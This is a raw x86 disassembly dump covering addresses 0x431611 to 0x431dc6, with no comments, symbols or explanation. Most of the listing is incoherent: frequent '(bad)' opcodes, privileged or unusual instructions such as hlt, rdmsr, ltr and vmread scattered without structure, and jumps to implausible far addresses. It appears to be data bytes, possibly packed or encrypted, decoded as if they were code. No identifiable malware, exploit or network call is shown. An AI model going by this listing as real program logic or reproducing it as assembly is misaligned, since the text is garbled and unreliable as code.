  431611:	lea    eax,[ebp-0x24]
  431614:	cmp    eax,0xc7fe9c8d
  431619:	push   eax
  43161b:	lea    eax,[ebp+0x45fff8fe]
  431621:	mov    esi,DWORD PTR [ecx]
  431623:	hlt    
  431624:	lahf   
  431625:	push   esp
  431626:	mov    edx,DWORD PTR [ecx-0x4]
  431629:	xor    eax,DWORD PTR [eax+0x7201bb]
  43162f:	add    BYTE PTR [ebp-0x35],al
  431632:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  431638:	mov    edx,DWORD PTR [ecx-0x74]
  43163b:	rol    BYTE PTR [eax],0x8d
  43163e:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  431642:	nop
  431643:	push   ecx
  431644:	add    bh,bh
  431646:	mov    esp,edi
  431648:	in     al,0x85
  43164a:	jge    0x43164a
  43164c:	test   edi,edi
  43164e:	jne    0x4315d5
  431650:	(bad)  
  431651:	(bad)  
  431652:	sbb    bh,bh
  431654:	push   ebp
  431655:	inc    ebp
  431656:	call   0xffdc10e6
  43165b:	add    BYTE PTR [ebp+0x66],al
  43165e:	mov    edx,DWORD PTR [ebp-0xfc0075]
  431664:	cmp    al,0x85
  431666:	ud0    eax,DWORD PTR [ebp-0x1]
  43166a:	test   DWORD PTR [edi+0x74],ecx
  43166d:	dec    edi
  43166e:	inc    DWORD PTR [ebp-0x530004]
  431674:	dec    DWORD PTR [edi-0x75]
  431677:	dec    esi
  431678:	cld    
  431679:	test   DWORD PTR [eax+0xff01ff],eax
  43167f:	icebp  
  431680:	add    BYTE PTR [edi-0x3a],cl
  431683:	test   ebx,eax
  431685:	inc    BYTE PTR [ebp-0x1]
  431688:	jne    0x43168a
  43168a:	mov    eax,DWORD PTR [eax]
  43168c:	cld    
  43168d:	xor    BYTE PTR [ecx+0x500155],cl
  431693:	push   ebp
  431694:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43169a:	add    BYTE PTR [ebp+0x35e90f50],al
  4316a0:	add    al,BYTE PTR [eax]
  4316a2:	add    BYTE PTR [ebx-0x38fe4f80],al
  4316a8:	add    ah,ch
  4316aa:	or     BYTE PTR [ebp+0x4501f845],dh
  4316b0:	jmp    0xdf19a6
  4316b5:	(bad)  
  4316b6:	nop    ecx
  4316b9:	test   DWORD PTR [ebp+0x4502f8],eax
  4316bf:	xor    ecx,DWORD PTR [ebp-0x64]
  4316c2:	mov    eax,edi
  4316c4:	mov    ebx,DWORD PTR [eax+edx*2]
  4316c7:	add    eax,0x45fef885
  4316cc:	dec    DWORD PTR [ebx+0x339445]
  4316d2:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4316d8:	dec    DWORD PTR [ebx-0x460f0375]
  4316de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4316df:	add    esi,edi
  4316e1:	add    bh,bh
  4316e3:	rdpmc  
  4316e5:	add    BYTE PTR [ebx],0x1
  4316e8:	mov    DWORD PTR [eax],eax
  4316ea:	add    al,0x45
  4316ec:	dec    DWORD PTR [ecx-0x360b3373]
  4316f2:	dec    DWORD PTR [esi]
  4316f4:	push   eax
  4316f5:	jne    0x43173c
  4316f7:	mov    esi,DWORD PTR [ebx]
  4316f9:	cld    
  4316fa:	add    esp,ecx
  4316fc:	push   eax
  4316fd:	inc    DWORD PTR [ebp-0x75]
  431700:	add    eax,0x800e4
  431705:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43170b:	mov    DWORD PTR [ecx],eax
  43170d:	sbb    al,0x0
  43170f:	leave  
  431710:	test   DWORD PTR [edi-0x2],eax
  431713:	jne    0x431714
  431715:	call   0xff44011a
  43171a:	xor    BYTE PTR [ebp+0x4d],al
  43171d:	mov    edi,edi
  43171f:	enter  0x8,0x4d
  431723:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  431729:	mov    eax,DWORD PTR [eax]
  43172b:	cld    
  43172c:	add    DWORD PTR [ecx],ebx
  43172e:	inc    ebp
  43172f:	dec    ebp
  431730:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  431736:	inc    eax
  431737:	dec    DWORD PTR [ecx-0x270375]
  43173d:	add    BYTE PTR [ebx-0x39d72701],cl
  431743:	xchg   ecx,eax
  431744:	ret    
  431745:	add    BYTE PTR [ebp-0x830075],al
  43174b:	add    BYTE PTR [ebp-0x75],al
  43174e:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431754:	lea    edi,[edi-0xc]
  431757:	add    bh,bh
  431759:	mov    edx,DWORD PTR [eax-0x7b]
  43175c:	inc    ebp
  43175d:	rdpmc  
  43175f:	jne    0x431764
  431761:	add    BYTE PTR [eax-0x75],dl
  431764:	inc    ebp
  431765:	clc    
  431766:	add    eax,0x400009
  43176b:	mov    DWORD PTR [ebx-0x7f000304],ecx
  431771:	mov    eax,DWORD PTR [ecx]
  431773:	in     al,dx
  431774:	add    dh,al
  431776:	test   ebx,eax
  431778:	inc    BYTE PTR [ebp-0xff0001]
  43177e:	add    BYTE PTR [ebp-0x43],al
  431781:	cmp    esi,0xfffffff8
  431784:	(bad)  
  431785:	push   DWORD PTR [eax]
  431787:	add    BYTE PTR [ebp-0x3a],dl
  43178a:	test   ebx,eax
  43178c:	je     0x431713
  43178e:	mov    edi,edi
  431790:	sbb    al,0xff
  431792:	test   DWORD PTR gs:[eax],eax
  431795:	(bad)  
  431796:	js     0x431797
  431798:	add    BYTE PTR [ebx-0x39b20bdd],cl
  43179e:	sub    eax,ebx
  4317a0:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4317a6:	add    eax,DWORD PTR [eax]
  4317a8:	dec    ebp
  4317a9:	push   eax
  4317aa:	mov    al,BYTE PTR [ebp+0x1]
  4317ad:	mov    eax,DWORD PTR [ebp-0x68]
  4317b0:	mov    eax,DWORD PTR [eax]
  4317b2:	sbb    bh,al
  4317b4:	or     ah,dh
  4317b6:	dec    ebp
  4317b7:	inc    DWORD PTR [eax+0x4]
  4317ba:	push   ecx
  4317bb:	add    BYTE PTR [edx-0x1],dh
  4317be:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4317c4:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4317ce:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4317d4:	push   ecx
  4317d5:	cmp    BYTE PTR [ebx],al
  4317d7:	inc    ebp
  4317d8:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4317de:	(bad)  
  4317df:	(bad)  
  4317e0:	in     al,0xff
  4317e2:	add    BYTE PTR [ebp+0x0],al
  4317e5:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4317eb:	add    al,bh
  4317ed:	(bad)  
  4317ee:	jmp    0x8d85:0x74b0558d
  4317f5:	dec    DWORD PTR [eax]
  4317f7:	call   DWORD PTR [ebp-0x7b]
  4317fa:	mov    edi,esi
  4317fc:	lock call DWORD PTR [ebp-0x75]
  431800:	mov    esi,esp
  431802:	mov    ah,0xc6
  431804:	mov    bh,0xc3
  431806:	mov    DWORD PTR [ebx-0x110003c4],ecx
  43180c:	add    DWORD PTR [eax],0x450050ff
  431812:	mov    DWORD PTR [ebx+0x9598cc],ecx
  431818:	inc    edi
  43181a:	push   esp
  43181c:	jmp    0xcd00:0x650481ff
  431823:	mov    DWORD PTR [ebx],esi
  431825:	clc    
  431826:	cmp    edi,0xff9cff3c
  43182c:	jne    0x431836
  43182e:	mov    eax,eax
  431830:	add    esi,DWORD PTR [eax]
  431832:	int3   
  431833:	inc    ebp
  431834:	cmp    al,0x83
  431836:	add    BYTE PTR [eax],bl
  431838:	adc    DWORD PTR [ebx+0x768b5055],eax
  43183e:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431844:	mov    edi,eax
  431846:	cmp    BYTE PTR [ebp+0x45],cl
  431849:	jmp    0x4317d6
  43184b:	mov    ebx,DWORD PTR [esp+ebp*8]
  43184e:	inc    ebp
  43184f:	or     al,0x2
  431851:	dec    DWORD PTR [ebp+0x18]
  431854:	jne    0x4318ab
  431856:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  43185c:	mov    edi,DWORD PTR [ebx]
  43185e:	in     al,0x50
  431860:	xchg   ecx,eax
  431861:	jmp    0x3436766
  431866:	adc    al,0x8b
  431868:	inc    ebp
  431869:	mov    al,ds:0x8b04008b
  43186e:	push   ebp
  43186f:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  431875:	push   ebp
  431876:	test   DWORD PTR [ebx-0x2800d701],ecx
  43187c:	inc    ebp
  43187d:	dec    ebp
  43187e:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431884:	mov    DWORD PTR [eax],0xe9ff00f4
  43188a:	add    al,0x0
  43188c:	add    BYTE PTR [eax],al
  43188e:	mov    eax,edx
  431890:	push   eax
  431891:	rol    DWORD PTR [ebp-0xf0177],1
  431897:	bound  eax,QWORD PTR [ebp+0x50]
  43189a:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4318a0:	add    BYTE PTR [ecx+0x558df0ff],cl
  4318a6:	mov    al,0xf
  4318a8:	test   DWORD PTR [edx],edx
  4318aa:	call   DWORD PTR [ebp-0x7a0001]
  4318b0:	(bad)  
  4318b1:	loop   0x4318b2
  4318b3:	jnp    0xc6990cb9
  4318b9:	mov    eax,ebx
  4318bb:	cmp    al,0x8b
  4318bd:	(bad)  
  4318be:	cld    
  4318bf:	shr    esi,0xc
  4318c2:	add    dl,al
  4318c4:	push   eax
  4318c5:	lea    eax,[ebp-0x1]
  4318c8:	mov    edx,esi
  4318ca:	cwde   
  4318cb:	cli    
  4318cc:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4318d2:	or     BYTE PTR [eax],cl
  4318d4:	inc    ebp
  4318d5:	dec    ebp
  4318d6:	inc    DWORD PTR [ebx+0x74803914]
  4318dc:	add    DWORD PTR [ebx+0x451800],ecx
  4318e2:	call   DWORD PTR [eax+edx*1]
  4318e5:	add    ecx,DWORD PTR [ebp-0x34]
  4318e8:	push   edi
  4318e9:	adc    al,0x8
  4318eb:	mov    edx,DWORD PTR [ebp-0x14]
  4318ee:	mov    ecx,DWORD PTR [ebp+0x18]
  4318f1:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  4318f5:	inc    DWORD PTR [eax+esi*8]
  4318f8:	inc    ebp
  4318f9:	stos   BYTE PTR es:[edi],al
  4318fa:	mov    edx,DWORD PTR [ebp-0x4]
  4318fd:	add    DWORD PTR [ebp-0x1c],eax
  431900:	mov    edx,DWORD PTR [ebp-0x70]
  431903:	cmp    eax,DWORD PTR [eax]
  431905:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431906:	mov    eax,DWORD PTR [eax]
  431908:	cld    
  431909:	jae    0x43188b
  43190b:	add    eax,DWORD PTR [ecx]
  43190d:	clc    
  43190e:	add    BYTE PTR [eax+0x30],dl
  431911:	mov    DWORD PTR [ecx],esi
  431913:	clc    
  431914:	pop    ds
  431915:	inc    ebp
  431916:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  43191c:	(bad)  
  43191d:	push   DWORD PTR [edi]
  43191f:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431925:	(bad)  
  431926:	jae    0x431927
  431928:	mov    eax,DWORD PTR [ebp-0x740175]
  43192e:	sub    eax,DWORD PTR [eax]
  431930:	add    eax,DWORD PTR [eax]
  431932:	mov    DWORD PTR [ecx+0x5f],eax
  431935:	mov    DWORD PTR [ebx-0x4],ebx
  431938:	ret    0xff
  43193b:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431941:	ret    
  431942:	mov    eax,DWORD PTR [ebp-0x6f0075]
  431948:	add    BYTE PTR [ebp-0x7d],al
  43194b:	mov    DWORD PTR [eax],eax
  43194d:	add    al,0x84
  43194f:	inc    DWORD PTR [ecx]
  431951:	lea    eax,[eax]
  431953:	hlt    
  431954:	sar    bh,cl
  431956:	test   BYTE PTR [eax+0x1],dl
  431959:	inc    ebp
  43195a:	add    BYTE PTR [ebx],dh
  43195c:	test   BYTE PTR [ebx],0x84
  43195f:	push   eax
  431960:	add    BYTE PTR [ebp+0x0],al
  431963:	add    eax,0x86
  431968:	add    BYTE PTR [ebx-0x7f7b0340],cl
  43196e:	add    BYTE PTR [ecx],al
  431970:	add    BYTE PTR [eax],al
  431972:	mov    esi,0x550030
  431977:	mov    ecx,DWORD PTR [edi]
  431979:	cld    
  43197a:	fidiv  DWORD PTR [ebp+0x0]
  43197d:	mov    edi,DWORD PTR [ecx]
  43197f:	xor    BYTE PTR [eax+eax*1],0x84
  431983:	add    eax,DWORD PTR [eax]
  431985:	sbb    BYTE PTR [eax],al
  431987:	jne    0x43193a
  431989:	mov    eax,DWORD PTR [ecx]
  43198b:	sbb    BYTE PTR [eax],al
  43198d:	mov    DWORD PTR [ebp-0x1],esp
  431990:	add    BYTE PTR [eax+0x30e45ca],bh
  431996:	ret    0xb7fc
  431999:	dec    ebp
  43199a:	or     al,0x89
  43199c:	dec    ebp
  43199d:	cld    
  43199e:	cmovne ecx,DWORD PTR [eax-0x75]
  4319a2:	add    edi,esp
  4319a4:	seto   BYTE PTR [esi-0x72ffffff]
  4319ab:	inc    ebp
  4319ac:	adc    al,0x8b
  4319ae:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4319b5:	cmp    DWORD PTR [edi+0x72],edx
  4319b8:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4319be:	gs cmp al,0x0
  4319c1:	je     0x431999
  4319c3:	push   eax
  4319c4:	sar    BYTE PTR [eax],1
  4319c6:	mov    bh,0x3e
  4319c8:	push   cs
  4319c9:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4319cf:	add    DWORD PTR [ecx+0x12],ebp
  4319d2:	dec    edx
  4319d3:	(bad)  
  4319d4:	mov    eax,edx
  4319d6:	in     al,dx
  4319d7:	adc    DWORD PTR [ecx],esi
  4319d9:	pop    esi
  4319da:	inc    ecx
  4319db:	leave  
  4319dc:	or     DWORD PTR [eax],ebx
  4319de:	gs push ebp
  4319e0:	add    ah,ch
  4319e2:	into   
  4319e3:	in     al,dx
  4319e4:	enter  0xb756,0xf0
  4319e8:	push   cs
  4319e9:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  4319f3:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  4319f9:	jnp    0x74439f01
  4319ff:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431a05:	add    BYTE PTR [edi],cl
  431a07:	mov    edi,DWORD PTR [ecx-0x78]
  431a0a:	ltr    WORD PTR [ecx-0x7b]
  431a0e:	dec    DWORD PTR [edi]
  431a10:	clc    
  431a11:	out    0x45,eax
  431a13:	add    BYTE PTR [eax],cl
  431a15:	cmp    ebx,0xffffff8c
  431a18:	jge    0x431a1a
  431a1a:	jb     0x431a2c
  431a1c:	je     0x521a9c
  431a22:	pop    edx
  431a23:	push   esi
  431a24:	mov    ecx,DWORD PTR [edi]
  431a26:	in     al,dx
  431a27:	rol    DWORD PTR [ebp+0x0],1
  431a2a:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431a31:	cmp    DWORD PTR [ecx],0xfffffff0
  431a34:	hlt    
  431a35:	mov    esp,DWORD PTR [eax+0xf034d2b]
  431a3b:	(bad)  
  431a3d:	push   eax
  431a3e:	jns    0xb842febc
  431a44:	lock push cs
  431a46:	ror    edx,0x3
  431a49:	test   BYTE PTR [ecx+0x5500e800],cl
  431a4f:	dec    eax
  431a50:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431a54:	(bad)  
  431a55:	mov    esi,0x7f33ff5f
  431a5a:	inc    eax
  431a5b:	test   DWORD PTR [edx],eax
  431a5d:	je     0x431a1f
  431a5f:	mov    ecx,ecx
  431a61:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431a65:	and    eax,DWORD PTR [eax+0xf0103]
  431a6b:	jp     0x431a59
  431a6d:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431a71:	add    edx,DWORD PTR [edi+0x74]
  431a74:	sbb    BYTE PTR [ebp+0x4d001484],cl
  431a7a:	add    BYTE PTR [ebp-0x74c48bbb],al
  431a80:	je     0x431a05
  431a82:	cmp    eax,edi
  431a84:	js     0x431aa9
  431a86:	add    eax,0xeb0fc003
  431a8b:	jns    0x431a18
  431a8d:	vmread DWORD PTR [ecx+0x45],ebx
  431a91:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431a97:	adc    al,0x8b
  431a99:	jge    0x431aaf
  431a9b:	mov    edi,DWORD PTR [eax-0x4]
  431a9e:	add    edi,DWORD PTR [edi]
  431aa0:	or     bh,bh
  431aa2:	push   ebp
  431aa3:	push   es
  431aa4:	mov    DWORD PTR [ebp-0x4],ebx
  431aa7:	add    edi,esi
  431aa9:	pop    es
  431aaa:	add    esi,DWORD PTR [edi-0x48ccf183]
  431ab0:	mov    DWORD PTR [esp+esi*8],ecx
  431ab3:	inc    ebp
  431ab4:	pop    ebp
  431ab5:	xor    DWORD PTR [esi-0x4],0x3b
  431ab9:	add    edx,DWORD PTR [ecx+edi*1]
  431abc:	push   es
  431abd:	clc    
  431abe:	mov    bh,0xdb
  431ac0:	jp     0x431a79
  431ac2:	add    cl,BYTE PTR [esi]
  431ac4:	div    DWORD PTR [edi+0x4d8b0c1c]
  431aca:	test   edi,edi
  431acc:	je     0x431ac2
  431ace:	mov    eax,ecx
  431ad0:	or     BYTE PTR [ebx],al
  431ad2:	dec    BYTE PTR [ecx+0x7d3bec7d]
  431ad8:	jbe    0x431b4c
  431ada:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431ae0:	add    ecx,DWORD PTR [esi]
  431ae2:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  431ae8:	add    eax,DWORD PTR [ebx-0x287af783]
  431aee:	je     0x431b3d
  431af0:	mov    DWORD PTR [ecx],edi
  431af2:	mov    esi,eax
  431af4:	hlt    
  431af5:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431afc:	jb     0x431abe
  431afe:	jmp    0x431aeb
  431b00:	xor    esi,DWORD PTR [ebx]
  431b02:	pop    edi
  431b03:	pop    esi
  431b04:	pop    ebx
  431b05:	ret    
  431b06:	ret    0x8b
  431b09:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431b0f:	xor    DWORD PTR [ecx],0xc
  431b12:	pushf  
  431b13:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431b19:	rdmsr  
  431b1b:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431b22:	dec    ebp
  431b23:	ret    
  431b24:	mov    edi,DWORD PTR [esi-0x4]
  431b27:	pop    eax
  431b28:	dec    ebp
  431b29:	jne    0x431ab6
  431b2b:	xor    edi,esp
  431b2d:	inc    eax
  431b2e:	dec    ebp
  431b2f:	jbe    0x431b84
  431b31:	inc    eax
  431b32:	pop    ebp
  431b33:	add    edx,DWORD PTR [esi+0x8]
  431b36:	push   esp
  431b37:	dec    eax
  431b38:	push   ecx
  431b39:	mov    eax,edi
  431b3b:	and    al,0xf0
  431b3d:	jo     0x431b2a
  431b3f:	mov    eax,DWORD PTR [ebx]
  431b41:	sbb    BYTE PTR [ebp+0x4d],cl
  431b44:	mov    eax,DWORD PTR [ebx]
  431b46:	nop
  431b47:	or     BYTE PTR [eax],al
  431b49:	jne    0x431ba2
  431b4b:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431b51:	cld    
  431b52:	xor    edi,edi
  431b54:	add    edi,DWORD PTR [ebp+0x3]
  431b57:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431b5d:	js     0x431ae3
  431b5f:	jae    0x431b63
  431b61:	(bad)  
  431b63:	xor    al,0x5d
  431b65:	jmp    0x431af2
  431b67:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431b6e:	fdecstp 
  431b70:	test   BYTE PTR [edi],ah
  431b72:	add    bh,BYTE PTR [ebp+0x0]
  431b75:	add    ebx,DWORD PTR [ebp-0x77]
  431b78:	mov    edi,eax
  431b7a:	cmp    al,0x0
  431b7d:	adc    dh,BYTE PTR [ebx]
  431b7f:	jge    0x431b84
  431b81:	mov    edi,DWORD PTR [ebx]
  431b83:	jl     0x431b94
  431b85:	clc    
  431b86:	dec    edi
  431b87:	jge    0x431b89
  431b89:	mov    eax,DWORD PTR [ebx]
  431b8b:	jb     0x431b95
  431b8d:	mov    ecx,DWORD PTR [ebp-0x8]
  431b90:	mov    edi,edi
  431b92:	xor    edx,DWORD PTR [eax]
  431b94:	add    edi,DWORD PTR [ebx]
  431b96:	mov    DWORD PTR [ebp-0x10],edi
  431b99:	inc    edi
  431b9a:	pop    ebp
  431b9b:	jge    0x431bd8
  431b9d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431ba1:	mov    edx,0xc05d87f0
  431ba6:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431baa:	fimul  WORD PTR [eax]
  431bac:	fist   WORD PTR [ebp+0x1c]
  431baf:	in     al,dx
  431bb0:	jne    0x431b9e
  431bb2:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431bb8:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431bbc:	fdivp  st(0),st
  431bbe:	fild   WORD PTR [ebp+0x4510f85c]
  431bc4:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431bca:	inc    ebp
  431bcb:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431bd1:	mov    ebp,DWORD PTR [ebx-0x4]
  431bd4:	adc    al,0x8b
  431bd6:	rcl    DWORD PTR [eax],0x48
  431bd9:	mov    esi,0x7080803
  431bde:	fiadd  WORD PTR [ebp+0x4d]
  431be1:	(bad)  
  431be2:	mov    edx,DWORD PTR [edx-0x4]
  431be5:	mov    edx,DWORD PTR [ebp-0x4]
  431be8:	xor    ebx,DWORD PTR [ebx+0x330103]
  431bee:	mov    DWORD PTR [edi+0x872dc],edi
  431bf4:	xlat   BYTE PTR ds:[ebx]
  431bf5:	into   
  431bf6:	ffreep st(6)
  431bf8:	retf   0x6c7
  431bfb:	iret   
  431bfc:	dec    ebp
  431bfd:	inc    ebp
  431bfe:	mov    DWORD PTR [ebx],edi
  431c00:	fmul   QWORD PTR [edi]
  431c02:	dec    ebp
  431c03:	jnp    0x431c38
  431c05:	add    BYTE PTR [ebx],al
  431c07:	mov    ecx,DWORD PTR [esp+edi*8]
  431c0a:	inc    ebp
  431c0b:	dec    ebp
  431c0c:	lea    esi,[ebx]
  431c0e:	add    DWORD PTR [ebx],eax
  431c10:	jb     0x431c4d
  431c12:	add    BYTE PTR [edi],cl
  431c14:	inc    ebp
  431c15:	imul   eax,edi,0x858bd800
  431c1b:	cld    
  431c1c:	clc    
  431c1d:	mov    DWORD PTR [ebp+0x0],eax
  431c20:	inc    DWORD PTR [eax]
  431c22:	or     al,0xde
  431c24:	sbb    bh,0x1
  431c27:	retf   
  431c28:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431c2f:	dec    ebp
  431c30:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431c36:	enter  0x12de,0xdf
  431c3a:	inc    ebp
  431c3b:	pop    ebp
  431c3c:	dec    DWORD PTR [ebx-0x257f0ff4]
  431c42:	add    DWORD PTR [edx],edx
  431c44:	add    BYTE PTR [ebp+0x50],dl
  431c47:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431c4d:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431c53:	or     ah,al
  431c55:	pop    ss
  431c56:	cdq    
  431c57:	push   ebp
  431c58:	clc    
  431c59:	mov    eax,DWORD PTR [ebp-0x4]
  431c5c:	xor    edx,edx
  431c5e:	add    esi,DWORD PTR [ebx]
  431c60:	cmp    eax,DWORD PTR [ebx]
  431c62:	hlt    
  431c63:	cmp    DWORD PTR [ebx],esp
  431c65:	or     al,BYTE PTR [ebp+0xf]
  431c68:	mov    eax,DWORD PTR [edx]
  431c6a:	loopne 0x431c6c
  431c6c:	(bad)  
  431c6d:	mov    ecx,esi
  431c6f:	cld    
  431c70:	pushf  
  431c71:	pop    ebp
  431c72:	fwait
  431c73:	mov    esi,DWORD PTR [edx]
  431c75:	lock mov eax,eax
  431c78:	adc    BYTE PTR [ebx],al
  431c7a:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431c81:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431c87:	dec    ebp
  431c88:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431c8e:	(bad)  
  431c8f:	iret   
  431c90:	inc    ebp
  431c91:	(bad)  
  431c92:	jne    0x431ce1
  431c94:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431c9a:	(bad)  
  431c9b:	cmp    ebx,eax
  431c9d:	je     0x431c25
  431c9f:	add    edi,edi
  431ca1:	or     bh,bh
  431ca3:	dec    ebp
  431ca4:	inc    ebp
  431ca5:	mov    esi,DWORD PTR [ebx]
  431ca7:	cld    
  431ca8:	add    ecx,esi
  431caa:	cmp    ecx,DWORD PTR [eax-0xc]
  431cad:	mov    edx,DWORD PTR [edi]
  431caf:	or     BYTE PTR [ebp-0x7c],al
  431cb2:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431cb8:	test   BYTE PTR [ebx+ebx*4],cl
  431cbb:	inc    ebp
  431cbc:	xor    bh,BYTE PTR [esi]
  431cbe:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431cc5:	jne    0x431c8e
  431cc7:	mov    ebp,esp
  431cc9:	fcomp  DWORD PTR [ebx]
  431ccb:	add    BYTE PTR [ecx],al
  431ccd:	inc    DWORD PTR [ebp-0x75]
  431cd0:	(bad)  
  431cd1:	cld    
  431cd2:	add    al,0xce
  431cd4:	mov    ecx,edi
  431cd6:	cld    
  431cd7:	inc    ebp
  431cd8:	fidivr WORD PTR [ebx]
  431cda:	fbstp  TBYTE PTR [ebp-0x3e]
  431cdd:	mov    eax,DWORD PTR [eax]
  431cdf:	adc    BYTE PTR [ebx-0x3974038b],cl
  431ce5:	fadd   st,st(7)
  431ce7:	add    BYTE PTR [ebp-0x1],al
  431cea:	mov    ecx,DWORD PTR [esp+edi*8]
  431ced:	inc    ebp
  431cee:	mov    bh,0xc7
  431cf1:	loopne 0x431d38
  431cf3:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431cf9:	sbb    dh,BYTE PTR [ebx]
  431cfb:	pushf  
  431cfc:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431d02:	mov    eax,edi
  431d04:	cwde   
  431d05:	inc    ebp
  431d06:	inc    ebp
  431d07:	jne    0x431c94
  431d09:	mov    esp,esp
  431d0b:	clc    
  431d0c:	add    al,0x4d
  431d0e:	mov    DWORD PTR [ebx],esi
  431d10:	or     al,0x33
  431d12:	inc    ebp
  431d13:	lea    ecx,[ebx-0x398d13fd]
  431d19:	add    bh,al
  431d1b:	inc    ebp
  431d1c:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431d23:	add    ebp,esp
  431d25:	shufps xmm1,xmm3,0xc7
  431d29:	(bad)  
  431d2a:	jmp    0x74885853
  431d2f:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431d35:	hlt    
  431d36:	mov    ecx,DWORD PTR [edi]
  431d38:	fadd   DWORD PTR [ebp+0x0]
  431d3b:	xor    ecx,DWORD PTR [edi]
  431d3d:	add    ecx,ecx
  431d3f:	cmp    edi,edi
  431d41:	pmuludq mm7,QWORD PTR [edx+0x50]
  431d45:	(bad)  
  431d46:	jmp    0x431cd3
  431d48:	mov    edi,esp
  431d4a:	or     al,0xc6
  431d4c:	inc    ebp
  431d4d:	(bad)  
  431d4e:	mov    eax,DWORD PTR [ebp+0x10]
  431d51:	jne    0x431cdc
  431d53:	mov    eax,DWORD PTR [ecx]
  431d55:	clc    
  431d56:	add    BYTE PTR [ebp-0x40],cl
  431d59:	xor    edx,DWORD PTR [eax-0x73]
  431d5c:	jne    0x431d5f
  431d5e:	push   DWORD PTR [edx+0x8]
  431d61:	add    BYTE PTR [ebp+0x45],al
  431d64:	mov    ebp,ecx
  431d66:	cld    
  431d67:	add    BYTE PTR [ebp+0x0],cl
  431d6a:	xor    eax,DWORD PTR [ebp+0x3]
  431d6d:	mov    DWORD PTR [ebx],edi
  431d6f:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431d75:	sub    eax,0x5d330e4d
  431d7a:	lea    esi,[ebx]
  431d7c:	add    DWORD PTR [ebx],eax
  431d7e:	jb     0x431d69
  431d80:	add    BYTE PTR [eax],al
  431d82:	inc    ebp
  431d83:	add    bl,ch
  431d85:	inc    ebp
  431d86:	mov    esi,DWORD PTR [ebx]
  431d88:	or     al,0x3
  431d8a:	(bad)  
  431d8b:	mov    edi,eax
  431d8d:	in     al,dx
  431d8e:	scas   eax,DWORD PTR es:[edi]
  431d8f:	inc    ebp
  431d90:	mov    esi,DWORD PTR [ebx]
  431d92:	in     al,0x3
  431d94:	add    al,0x89
  431d96:	mov    ecx,DWORD PTR [eax+edi*8]
  431d99:	dec    ebp
  431d9a:	(bad)  
  431d9b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431da2:	mov    ecx,eax
  431da4:	cld    
  431da5:	push   es
  431da6:	dec    ebp
  431da7:	add    al,0x33
  431da9:	mov    DWORD PTR [ebx],eax
  431dab:	in     al,dx
  431dac:	cmp    DWORD PTR [ebp-0x67],eax
  431daf:	mov    eax,DWORD PTR [ebp-0xba0068]
  431db5:	mov    edx,DWORD PTR [ebp-0x4]
  431db8:	mov    ecx,DWORD PTR [ebp-0x2c]
  431dbb:	xor    eax,DWORD PTR [ebp+0x3]
  431dbe:	cmp    DWORD PTR [ebx],0x8b32749a
  431dc4:	xor    edi,esp
  431dc6:	jmp    0xff771b18
